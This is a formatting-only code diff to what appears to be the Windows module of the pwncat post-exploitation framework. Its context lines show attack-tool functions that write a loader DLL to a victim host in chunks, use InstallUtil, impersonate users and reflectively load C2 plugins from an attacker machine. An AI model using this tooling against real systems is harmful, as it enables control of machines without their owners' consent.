@@ -146,7 +146,6 @@ class WindowsFile(RawIOBase):
         try:
             result = self.platform.run_method("File", "read", self.handle, len(b))
         except ProtocolError as exc:
-
             # ERROR_BROKEN_PIPE
             if exc.code == 0x6D:
                 self.eof = True
@@ -287,7 +286,10 @@ class PopenWindows(pwncat.subprocess.Popen):
                 )
             if self.stdin is not None:
                 self.stdin = TextIOWrapper(
-                    self.stdin, encoding=encoding, errors=errors, write_through=True,
+                    self.stdin,
+                    encoding=encoding,
+                    errors=errors,
+                    write_through=True,
                 )
 
     def detach(self):
@@ -581,7 +583,6 @@ class Windows(Platform):
         self.channel.sendline(thing)
 
         if wait:
-
             keyboard_interrupt = False
 
             # Receive the response
@@ -678,7 +679,7 @@ function prompt {
         # Write remaining chunks to selected path
         for c in range(chunk_sz, len(loader_dll), chunk_sz):
             self.channel.send(
-                f"""echo {loader_dll[c:c + chunk_sz].decode('utf-8')} >>"{loader_remote_path!s}"\n""".encode(),
+                f"""echo {loader_dll[c : c + chunk_sz].decode("utf-8")} >>"{loader_remote_path!s}"\n""".encode(),
             )
             self.channel.recvline()
             self.channel.recvuntil(b">")
@@ -709,7 +710,8 @@ function prompt {
         version = pathlib.PureWindowsPath(install_utils).parts[-2]
 
         self.session.log(
-            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False,
+            f"using install utils from .net [cyan]{version}[/cyan]",
+            highlight=False,
         )
 
         install_utils = install_utils.replace(" ", "\\ ")
@@ -879,7 +881,6 @@ function prompt {
             self.interactive_tracker = 0
             return
         if not value:
-
             # Receive the method response
             data = self.parse_response(self.channel.recvline())
             if data["error"] != 0:
@@ -902,7 +903,6 @@ function prompt {
         has_cr = False
 
         for idx, b in enumerate(data):
-
             # Basically, we just transform bare \r to \r\n
             if has_cr and b != ord("\n"):
                 transformed.append(ord("\n"))
@@ -979,7 +979,10 @@ function prompt {
 
         try:
             p = self.run(
-                ["where.exe", path], capture_output=True, text=True, check=True,
+                ["where.exe", path],
+                capture_output=True,
+                text=True,
+                check=True,
             )
 
             return p.stdout.strip()
@@ -1291,7 +1294,10 @@ function prompt {
         return result
 
     def tempfile(
-        self, mode: str, length: int | None = 8, suffix: str | None = None,
+        self,
+        mode: str,
+        length: int | None = 8,
+        suffix: str | None = None,
     ):
         """Create a temporary file in a safe directory. Optionally provide a suffix"""
 
@@ -1428,7 +1434,9 @@ function prompt {
         return self.impersonate(0)
 
     def dotnet_load(
-        self, name: str, content: bytes | BytesIO | None = None,
+        self,
+        name: str,
+        content: bytes | BytesIO | None = None,
     ) -> DotNetPlugin:
         """
         Reflectively load a .Net C2 plugin from the attacker machine. The
